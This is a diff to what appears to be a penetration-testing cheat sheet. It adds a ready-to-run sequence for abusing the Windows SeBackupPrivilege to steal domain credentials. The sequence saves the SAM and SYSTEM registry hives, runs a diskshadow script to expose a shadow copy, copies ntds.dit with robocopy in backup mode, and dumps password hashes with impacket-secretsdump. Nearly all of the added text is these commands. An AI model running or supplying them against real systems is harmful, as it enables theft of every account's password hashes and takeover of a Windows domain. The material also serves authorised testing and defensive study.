@@ -3635,7 +3635,38 @@ Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
 reg save HKLM\SYSTEM c:\temp\system
 ```
 
-Download `ndts.dit` and system and get the hashes from `impacket-secretsdump` of the impacket-suite.
+###### Extract the Hashes
+
+```c
+impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
+```
+
+###### Alternative Way via Robocopy
+
+```c
+reg save hklm\sam C:\temp\sam
+reg save hklm\system C:\temp\system
+```
+
+```c
+set metadata C:\Windows\temp\meta.cabX
+set context clientaccessibleX
+set context persistentX
+begin backupX
+add volume C: alias cdriveX
+createX
+expose %cdrive% E:X
+end backupX
+```
+ 
+```c
+diskshadow /s script.txt
+robocopy /b E:\Windows\ntds . ntds.dit
+```
+
+```c
+impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
+```
 
 ###### SeTakeOwnership Privilege
 
